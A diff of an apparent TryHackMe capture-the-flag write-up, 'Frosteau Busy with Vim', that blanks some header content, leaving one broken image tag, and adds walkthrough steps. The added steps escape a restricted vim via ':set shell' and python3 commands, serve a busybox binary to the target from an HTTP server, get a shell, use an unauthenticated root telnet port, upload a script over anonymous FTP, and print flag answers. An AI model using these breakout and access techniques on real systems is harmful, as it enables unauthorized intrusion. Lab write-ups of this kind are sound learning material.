@@ -1,16 +1,13 @@
 <h1 align="center">Frosteau Busy with Vim</h1>
 <p align="center">2025, August 24<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>474</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
-<em>Use your defence evasion skills to take control of a secure network.</em><br>
-<img width="80px" src="https://github.com/user-attachments/assets/8cab783d-2a47-4e1b-bb76-71ba226fa3b1"><br>
+<em></em><br>
+<img width="80px" src=""><br>
 Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/bypass">here </a>.<br>
-<img width="1200px" src="https://github.com/user-attachments/assets/a692f188-386c-49ad-a516-3c47e7ea5dde"></p>
+<img width="1200px" src="></p>
 
 <br>
-<h2>Task 1 . Bypass</h2>
+<h2>Task 1 . </h2>
 
-<p>Start the VM by clicking the <code>Start Machine</code> button at the top right of the task. You can complete the challenge by connecting through a VPN or the AttackBox containing all the essential tools.</p>
-
-<p><em>The network security team has implemented state-of-the-art protection mechanisms using an IDS. Your task is to bypass the network security solution and gain access to the CCTV web panel of the company.</em></p>
 
 <p><em>Answer the questions below</em></p>
 
@@ -218,17 +215,21 @@ PORT     STATE SERVICE REASON         VERSION
 ```
 
 <br>
+<br>
 
 <img width="997" height="204" alt="image" src="https://github.com/user-attachments/assets/feeb9c85-a532-410f-9a30-74d40c8f4ff4" />
 
+<br>
 <br>
 
 <img width="991" height="309" alt="image" src="https://github.com/user-attachments/assets/64079947-0008-4efe-b118-71264fa4e535" />
 
 <br>
+<br>
 
 <img width="998" height="197" alt="image" src="https://github.com/user-attachments/assets/8ea70a29-3d1a-4f99-8928-d0ddcb472f63" />
 
+<br>
 <br>
 
 <img width="994" height="289" alt="image" src="https://github.com/user-attachments/assets/b837d701-5a38-4c0d-93f9-2f610dc764a9" />
@@ -290,13 +291,9 @@ ftp> bye
 ```
 
 <br>
-
-<img width="912" height="848" alt="image" src="https://github.com/user-attachments/assets/6a838c4d-df48-4efe-8df4-bf398c49e97b" />
-
 <br>
 
-<img width="1106" height="750" alt="image" src="https://github.com/user-attachments/assets/152705d3-5ed6-4a8b-bad2-be6d6bc28716" />
-
+<img width="912" height="848" alt="image" src="https://github.com/user-attachments/assets/6a838c4d-df48-4efe-8df4-bf398c49e97b" />
 
 <br>
 <br>
@@ -323,6 +320,7 @@ THM{Let.the.game.begin}
 
 <img width="1013" height="106" alt="image" src="https://github.com/user-attachments/assets/bd5034e2-aa8e-4613-bc86-689906f0b2e8" />
 
+<br>
 <br>
 
 ```bash
@@ -369,18 +367,21 @@ All personnel involved in the apprehension of the Frostling Five are to exercise
 ```
 
 <br>
-
+<br>
 
 <img width="588" height="682" alt="image" src="https://github.com/user-attachments/assets/dc603d08-eb9e-422a-88ab-d13c01d21a79" />
 
+<br>
 <br>
 
 <img width="590" height="680" alt="image" src="https://github.com/user-attachments/assets/badbbcf4-60a4-40c3-8c28-67c4e119909f" />
 
 <br>
+<br>
 
 <img width="587" height="683" alt="image" src="https://github.com/user-attachments/assets/1c6779b5-bba7-4da9-b52a-2a8396d25d41" />
 
+<br>
 <br>
 
 <img width="586" height="681" alt="image" src="https://github.com/user-attachments/assets/e25f5244-8221-4a0e-8691-51f5b27e9d2e" />
@@ -395,6 +396,396 @@ Trying 10.201.54.165...
 Connected to 10.201.54.165.
 Escape character is '^]'.
 ```
+
+```bash
+~
+~
+~
+:echo $FLAG2
+```
+
+```bash
+~
+~
+~
+THM{Seems.like.we.are.getting.busy}
+```
+<br>
+
+<p>1.2. Flag 2<br>
+<code>THM{Seems.like.we.are.getting.busy}</code><br>
+
+<br>
+<br>
+
+```bash
+~
+~
+~
+:Ex
+```
+
+<p>[ENTER]</p>
+
+<br>
+<br>
+
+<img width="1123" height="771" alt="image" src="https://github.com/user-attachments/assets/485a59c7-5254-48fe-8e4b-bf93df2ec898" />
+
+<br>
+<br>
+
+<img width="1128" height="771" alt="image" src="https://github.com/user-attachments/assets/f8ed75e6-4a65-45d6-bca6-9a85a5c81780" />
+
+<br>
+<br>
+
+<img width="1122" height="341" alt="image" src="https://github.com/user-attachments/assets/62400373-cf81-4f06-8732-f4e54898dd75" />
+
+<br>
+<br>
+
+<img width="1125" height="258" alt="image" src="https://github.com/user-attachments/assets/936ab6a3-7442-43eb-a767-43c5e9dbe06f" />
+
+<br>
+<br>
+
+<img width="1121" height="294" alt="image" src="https://github.com/user-attachments/assets/fd61f857-e4a6-4947-82ff-3c46b3caaeb7" />
+
+
+
+
+<br>
+<br>
+
+<img width="1106" height="750" alt="image" src="https://github.com/user-attachments/assets/152705d3-5ed6-4a8b-bad2-be6d6bc28716" />
+
+<br>
+<br>
+
+
+```bash
+~
+~
+:set shell=/tmp/sh|:shell
+```
+
+```bash
+~
+~
+Cannot execute shell /tmp/sh
+```
+
+<br>
+
+```bash
+~
+~
+:python3 import os; print(os.listdir('/home'))
+```
+
+```bash
+['ubuntu']
+```
+
+<br>
+<br>
+
+<img width="1005" height="37" alt="image" src="https://github.com/user-attachments/assets/d5f1d799-780f-431f-a2a0-a098da16f273" />
+
+<br>
+<br>
+
+```bash
+~
+~
+:python3 import os; print(os.listdir('/home/ubuntu'))
+```
+
+```bash
+['.local']
+```
+
+<br>
+
+```bash
+~
+~
+:python3 import getpass; print(getpass.getuser())
+```
+
+```bash
+ubuntu
+```
+
+<br>
+
+```bash
+~
+~
+:python3 import os; print(os.getenv('SHELL'))
+```
+
+```bash
+/tmp/sh
+```
+
+<br>
+
+```bash
+~
+~
+:python3 import os; print(os.listdir('/usr'))
+```
+
+```bash
+['libexec', 'lib', 'sbin', 'src', 'bin', 'include', 'share', 'lib64', 'libx32', 'games', 'local', 'lib32', 'frosty', 'special']
+```
+
+<br>
+<br>
+
+<img width="1124" height="67" alt="image" src="https://github.com/user-attachments/assets/dd4a984e-74c3-4975-b20b-dcfa4b86150f" />
+
+<br>
+<br>
+
+```bash
+~
+~
+:python3 import os; print(os.listdir('/usr/special'))
+```
+
+```bash
+['protector.sh']
+```
+
+<br>
+<br>
+
+<img width="1121" height="100" alt="image" src="https://github.com/user-attachments/assets/72dfb9b5-f32b-4a87-b975-4c987b038e05" />
+
+<br>
+<br>
+
+```bash
+~
+~
+:python3 import os; print(os.listdir('/usr/frosty'))
+```
+
+```bash
+['sh']
+```
+
+<br>
+<br>
+
+<img width="1125" height="154" alt="image" src="https://github.com/user-attachments/assets/80f694dd-5c4f-4d71-9d5b-340fff41b33a" />
+
+
+<h4>Busybox</h4>
+
+<p>
+
+- search for <code>Busybox static download</code><br>
+- navigate to <code>https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/<code><br>
+- click <code>1.35.0-x86_64-linux-musl</code><br>
+- click <code>busybox</code>
+- <code>Save</code></p>
+
+<br>
+
+<img width="1128" height="601" alt="image" src="https://github.com/user-attachments/assets/6048c7b8-e6f6-4295-b788-d808da56cdee" />
+
+<br>
+<br>
+<h4>HTTP server</h4>
+
+```bash
+$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+<br>
+<br>
+
+<img width="1125" height="216" alt="image" src="https://github.com/user-attachments/assets/e33a8a5f-514a-44b2-8e5f-7a07b1f12d7f" />
+
+
+<br>
+<br>
+<h4>HTTP server</h4>
+
+```bash
+$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.201.54.165 - - [24/Aug/2025 20:21:02] "GET /busybox HTTP/1.1" 200 -
+```
+
+<br>
+<h3></h3>
+
+<br>
+<br>
+
+<img width="1119" height="772" alt="image" src="https://github.com/user-attachments/assets/5f0032e1-d7e7-4bcc-9de1-4a533cba52f7" />
+
+<br>
+<br>
+
+
+```bash
+~
+~
+:set shell=/usr/frosty/sh|:shell
+[No write since last change]
+
+
+BusyBox v1.30.1 (Ubuntu 1:1.30.1-4ubuntu6.5) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+$ whoami
+/usr/frosty/sh: whoami: not found
+$ ls -la
+-rwxr-xr-x    1         0 .dockerenv
+lrwxrwxrwx    1         9 lib32 -> usr/lib32
+lrwxrwxrwx    1        10 libx32 -> usr/libx32
+lrwxrwxrwx    1         9 lib64 -> usr/lib64
+drwxr-xr-x    2      4096 media
+drwxr-xr-x    2      4096 mnt
+drwxr-xr-x    1      4096 ..
+drwxr-xr-x    1      4096 var
+lrwxrwxrwx    1         7 bin -> usr/bin
+drwxr-xr-x    1      4096 etc
+drwxr-xr-x    1      4096 home
+drwxr-xr-x    1      4096 usr
+drwxr-xr-x    1      4096 .
+drwx------    1      4096 root
+lrwxrwxrwx    1         8 sbin -> usr/sbin
+drwxr-xr-x   11      3120 dev
+drwxr-xr-x    2      4096 opt
+drwxrwxrwt    1      4096 tmp
+drwxr-xr-x    2      4096 boot
+drwxr-xr-x    1      4096 run
+drwxr-xr-x    2      4096 srv
+lrwxrwxrwx    1         7 lib -> usr/lib
+dr-xr-xr-x  247         0 proc
+dr-xr-xr-x   13         0 sys
+$ cd /home/ubuntu
+$ ls -la
+drwxrwxr-x    3      4096 .local
+drwxr-xr-x    1      4096 ..
+drwxr-xr-x    1      4096 .
+$ cd .local/
+$ ls -la
+drwx------    3      4096 share
+drwxr-xr-x    1      4096 ..
+drwxrwxr-x    3      4096 .
+$ cd share/
+$ ls -la
+drwxrwxr-x    3      4096 ..
+drwx------    3      4096 .
+drwx------    2      4096 nano
+$ pwd
+/home/ubuntu/.local/share
+$ echo $FLAG2
+THM{Seems.like.we.are.getting.busy}
+```
+
+<br>
+
+<p>1.2. Flag 2<br>
+<code>THM{Seems.like.we.are.getting.busy}</code><br>
+
+<br>
+<br>
+
+<p>
+
+- .dockerenv</p>
+
+<br>
+
+```bash
+$ cd /
+$ ls -la
+-rwxr-xr-x    1         0 .dockerenv
+lrwxrwxrwx    1         9 lib32 -> usr/lib32
+lrwxrwxrwx    1        10 libx32 -> usr/libx32
+lrwxrwxrwx    1         9 lib64 -> usr/lib64
+drwxr-xr-x    2      4096 media
+drwxr-xr-x    2      4096 mnt
+drwxr-xr-x    1      4096 ..
+drwxr-xr-x    1      4096 var
+lrwxrwxrwx    1         7 bin -> usr/bin
+drwxr-xr-x    1      4096 etc
+drwxr-xr-x    1      4096 home
+drwxr-xr-x    1      4096 usr
+drwxr-xr-x    1      4096 .
+drwx------    1      4096 root
+lrwxrwxrwx    1         8 sbin -> usr/sbin
+drwxr-xr-x   11      3120 dev
+drwxr-xr-x    2      4096 opt
+drwxrwxrwt    1      4096 tmp
+drwxr-xr-x    2      4096 boot
+drwxr-xr-x    1      4096 run
+drwxr-xr-x    2      4096 srv
+lrwxrwxrwx    1         7 lib -> usr/lib
+dr-xr-xr-x  247         0 proc
+dr-xr-xr-x   13         0 sys
+$ cd /root
+/usr/frosty/sh: cd: can't cd to /root: Permission denied
+$ 
+```
+
+<br>
+<br>
+<h3>port 8065</h3>
+
+```bash
+:~/FrosteauBusyWithVim# telnet 10.201.54.165 8065
+Trying 10.201.54.165...
+Connected to 10.201.54.165.
+Escape character is '^]'.
+
+Ubuntu 22.04.3 LTS
+
+
+BusyBox v1.30.1 (Ubuntu 1:1.30.1-4ubuntu6.5) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+# 
+```
+
+<br>
+<br>
+
+```bash
+:~/FrosteauBusyWithVim# ftp 10.201.54.165 8075
+Connected to 10.201.54.165.
+220 Operation successful
+Name (10.201.54.165:root): anonymous
+230 Operation successful
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> mkdir tmp
+257 Operation successful
+ftp> cd tmp
+250 Operation successful
+ftp> put flag-2-of-4.sh
+local: flag-2-of-4.sh remote: flag-2-of-4.sh
+200 Operation successful
+150 Ok to send data
+226 Operation successful
+12 bytes sent in 0.00 secs (509.5109 kB/s)
+ftp> 
+```
+
+
+
+
+<img width="1120" height="684" alt="image" src="https://github.com/user-attachments/assets/b18b931a-debf-42a8-b404-bfb1c799eaf6" />
 
 
 ```bash
